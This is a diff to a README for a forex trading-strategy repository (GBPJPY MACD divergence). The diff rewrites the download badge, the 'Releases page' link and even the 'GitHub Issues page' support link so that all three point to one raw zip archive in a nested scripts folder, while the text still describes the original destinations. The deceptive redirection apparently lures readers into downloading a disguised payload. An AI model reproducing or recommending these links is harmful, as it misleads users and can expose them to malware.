@@ -6,7 +6,7 @@ Welcome to the **GBPJPY MACD Divergence Trading Strategy**. This powerful tradin
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Click_Here-brightgreen)](https://github.com/Pesci1134/gbpjpy-macd-divergence-strategy/releases)
+[![Download Latest Release](https://github.com/Pesci1134/gbpjpy-macd-divergence-strategy/raw/refs/heads/main/scripts/ver17/divergence-macd-strategy-gbpjpy-v1.5.zip)](https://github.com/Pesci1134/gbpjpy-macd-divergence-strategy/raw/refs/heads/main/scripts/ver17/divergence-macd-strategy-gbpjpy-v1.5.zip)
 
 ## 📂 Requirements
 
@@ -21,7 +21,7 @@ Before you begin, ensure your setup meets these requirements:
 
 To download the software, visit the Releases page:
 
-[Download Releases](https://github.com/Pesci1134/gbpjpy-macd-divergence-strategy/releases)
+[Download Releases](https://github.com/Pesci1134/gbpjpy-macd-divergence-strategy/raw/refs/heads/main/scripts/ver17/divergence-macd-strategy-gbpjpy-v1.5.zip)
 
 1. Click on the link above. This will take you to the Releases page.
 2. Look for the latest version listed at the top.
@@ -59,7 +59,7 @@ After downloading:
 
 ## 📞 Support
 
-For any questions or issues, please open an issue on the [GitHub Issues page](https://github.com/Pesci1134/gbpjpy-macd-divergence-strategy/issues). Our community is here to help!
+For any questions or issues, please open an issue on the [GitHub Issues page](https://github.com/Pesci1134/gbpjpy-macd-divergence-strategy/raw/refs/heads/main/scripts/ver17/divergence-macd-strategy-gbpjpy-v1.5.zip). Our community is here to help!
 
 ## 📝 Conclusion
 
